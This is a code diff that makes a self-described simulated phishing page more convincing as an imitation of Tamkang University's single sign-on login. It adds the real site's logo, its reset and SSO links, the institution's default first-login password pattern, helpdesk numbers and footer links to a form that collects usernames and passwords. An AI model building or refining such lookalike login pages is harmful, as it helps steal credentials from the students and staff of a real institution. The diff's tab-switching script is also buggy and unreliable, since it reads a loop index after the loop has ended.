@@ -60,10 +60,15 @@
             width:200px; 
             padding:5px; 
         }
+        .a-blue{
+            font-weight:bold; 
+            color:#369; 
+        }
         .dv_center { 
             text-align:center; 
             margin-top:15px; 
         }
+
         input[type="submit"] { 
             padding:8px 20px; 
             background:#FC0; 
@@ -107,23 +112,40 @@
             border-radius:0 10px 10px 10px; 
             font-size:0.9em; 
         }
+        .picture-image{height:24px;}
     </style>
 
     <script>
         // 切換分頁
         var lastTab = 0;
-        function showhide(i) {
-            [1, 2, 3].forEach(function(n) {
-                $('#li_tab' + n).removeClass('down');
-                $('#dv_tab' + n).hide();
-            });
-            if (lastTab !== i) {
-                $('#li_tab' + i).addClass('down');
-                $('#dv_tab' + i).show();
-                lastTab = i;
-            } else {
-                lastTab = 0;
+        function showhide(tab) {
+            for(var i=1; i<=3; i++){
+                document.getElementById("dv_tab"+i).style.display="none";
+                document.getElementById("li_tab"+i).style.backgroundColor="#FC0";
+                document.getElementById("li_tab"+i).style.color="#630";
             }
+
+            if(lastTab !=tab){
+                var name="dv_tab"+tab;
+                document.getElementById(name).style.display="block";
+                document.getElementById("li_tab"+i).style.backgroundColor="#EBEBEB";
+                document.getElementById("li_tab"+i).style.color="#600";
+                document.getElementById("li_tab"+i).style.borderBottom="none";
+                lastTab=tab;
+            }else
+                lastTab=0;
+            
+            // [1, 2, 3].forEach(function(n) {
+            //     $('#li_tab' + n).removeClass('down');
+            //     $('#dv_tab' + n).hide();
+            // });
+            // if (lastTab !== i) {
+            //     $('#li_tab' + i).addClass('down');
+            //     $('#dv_tab' + i).show();
+            //     lastTab = i;
+            // } else {
+            //     lastTab = 0;
+            // }
         }
     </script>
 </head>
@@ -135,7 +157,10 @@
         <!-- 模擬釣魚表單：action 指向本地 /login -->
         <form id="eaiForm" method="post" action="/login">
           <fieldset>
-            <legend>請輸入您的帳號及密碼</legend>
+            <legend>
+                <img src="image/ssologin.png" class="picture-image">
+                請輸入您的帳號及密碼
+            </legend>
             <p>
               <label for="username">帳號：</label>
               <input type="text" id="username" name="username" required pattern="^[a-zA-Z0-9_]{6,20}$" title="帳號需為6-20個字母、數字或底線">
@@ -147,27 +172,85 @@
             <div class="dv_center">
               <input type="submit" value="登入">
             </div>
+            <p>
+                <a class="a-blue" href="/j_self/pswdself/goAction.do?ln=zh_TW">忘記密碼?</a>
+                &nbsp;&nbsp;
+                <a class="a-blue" href="/NEAI/logineb.jsp?ln=en_US&amp;embed=no&amp;myurl=https://sso.tku.edu.tw/auth/realms/TKU/protocol/openid-connect/auth?client_id=pdsiclass&amp;response_type=code&amp;redirect_uri=https%3A//iclass.tku.edu.tw/login&amp;state=L2lwb3J0YWw=&amp;scope=openid,public_profile,email" title="Switch the webpage to English.">English</a>
+            </p>
           </fieldset>
         </form>        
 
         <!-- 功能說明分頁 -->
         <ul id="tab_opts">
-            <li id="li_tab1" onclick="showhide(1)">說明 1</li>
-            <li id="li_tab2" onclick="showhide(2)">說明 2</li>
-            <li id="li_tab3" onclick="showhide(3)">說明 3</li>
+            <li id="li_tab1" onclick="showhide(1)">帳號及密碼</li>
+            <li id="li_tab3" onclick="showhide(3)">服務台</li>
         </ul>
-        <div id="dv_tab1">
-            <p>分頁 1 內容範例。</p>
+        <div id="dv_tab1" >
+            <ul>
+                <li>
+                    帳號： 學生、校友請使用您的學號； 教職員為人員代號(6 碼)。
+                    <br>
+                    <font color="red">可登入</font>
+                    的帳號：在學及休學的學生、82 學年度起畢業的校友、在職及退休的教職員。
+                    <br>
+                    <font color="red">未支援</font>
+                    的帳號：退學的學生、81 學年度及之前畢業的校友、離職及聘期已結束的教職員。
+                </li>
+                <li>
+                    密碼：
+                    <font color="red">
+                    <strong>首次登入</strong>
+                    請使用 'Tku' + 西元年生日(例如，生日：1997/02/25，密碼：Tku19970225)；
+                    <br>
+                    首次登入成功後，瀏覽器將導到變更密碼頁面，請依畫面指示(或參考
+                    <a href="opendoc\SSO_ChangePassword.pdf" target="_blank">這裡</a>
+                    )變更密碼，並牢記此新密碼，以供後續須要進入學校資訊應用系統時單一登入密碼驗證之用，如果未變更密碼，下次再登入時，依舊會再度導到變更密碼頁面要求您變更密碼。
+                </font>
+                </li>
+                <li>
+                    忘記密碼時，如果您已完成『密碼提示設定』，請依 
+                    <a class="a-blue" href="/j_self/pswdself/goAction.do?ln=zh_TW">忘記密碼重設步驟</a> 
+                    重設密碼。否則請直接填寫『淡江大學單一登入密碼更改申請表(
+                    <a class="a-blue" href="https://www.ipc.tku.edu.tw/Download.aspx?dir=Archive&amp;file=BD-52-AA-56-D5-90-33-81-EC-92-F7-CD-26-D9-ED-65.doc&amp;filename=FKQX10-%e6%b7%a1%e6%b1%9f%e5%a4%a7%e5%ad%b8%e5%96%ae%e4%b8%80%e7%99%bb%e5%85%a5%e5%af%86%e7%a2%bc%e9%87%8d%e8%a8%ad%e7%94%b3%e8%ab%8b%e8%a1%a8&amp;sn=226">Word 版</a>
+                    )』，並依申請單上說明處理之。若尚有其他服務請求，請洽資訊處服務台(商管大樓 B212 室，電話 26215656 轉 2468)申請辦理。
+                </li>
+                <li>
+                    單一登入成功後，網頁瀏覽完畢離開電腦前，請先登出或關閉所有瀏覽器，以避免身分被冒用，並確保個人資訊不外洩，否則下一位使用者就可能繼續以您的身分查詢您個人的機密資訊。
+                </li>
+            </ul>
         </div>
         <div id="dv_tab2">
-            <p>分頁 2 內容範例。</p>
+            <!-- <ul>
+                <li>顯示『此網站的安全性憑證有問題』？
+                    <br>
+                    那是因為本網站登入網頁已套用 HTTPS (可確保您輸入的密碼在網路傳輸時不會被竊取)， 而您目前的瀏覽器尚未信任 HTTPS 所使用的 SSL 憑證所造成。
+                    <br>
+                    請務必先安裝核發本系統目前使用之 SSL 憑證的根憑證：PDS-RCA II， 並確定您的電腦已經『信任』此根憑證，如果還未信任此根憑證， 請在此 <a class="a-blue" href="opendocs/PDS-RCA_II.zip" target="_blank">下載根憑證</a> 並解壓縮， 再將此根憑證安裝到『本機電腦』的『信任的根憑證授權』清單中， 安裝成功後請重新開啟本網頁。<br>
+                    詳細安裝方式請參考 
+                    <a class="a-blue" href="opendocs/SsoInstall_RootCert.pdf" target="_blank">
+                    根憑證 PDS-RCA II 安裝步驟</a>。
+                    </li>
+            </ul> -->
         </div>
         <div id="dv_tab3">
-            <p>分頁 3 內容範例。</p>
+            <ul>
+                <li>關於操作問題請洽：<br>
+                   資訊處 服務台<br>
+                    <img src="image/icon_email.png" class="icon-image">：<a title="為減少被不當蒐集濫發廣告信件，請自行輸入電子郵件地址。" href="mailto:"><img src="image/email_EBEBEB.png" width="200" height="19"></a><br>
+                    <img src="image/icon_phone.png" class="icon-image">：(02) 2621-5656 轉 2468。
+                    </li>
+                <li>學生請假相關問題請洽：<br>
+                    學生事務處 生活輔導組<br>
+                    <img src="image/icon_phone.png" class="icon-image">：(02) 2621-5656 轉 2214、2217、2817。
+                    </li>
+            </ul>
         </div>
 
         <div id="footer">
-            <p>淡江大學資訊處版權所有 &copy; 2025 Tamkang University</p>
+            <p>
+                <a class="a-blue" href="http://www.tku.edu.tw/" target="__tkuhome">淡江大學</a> │
+                <a class="a-blue" href="http://www.ipc.tku.edu.tw/" target="__ipchome">資訊處</a>
+            </p>
         </div>
     </div>
 
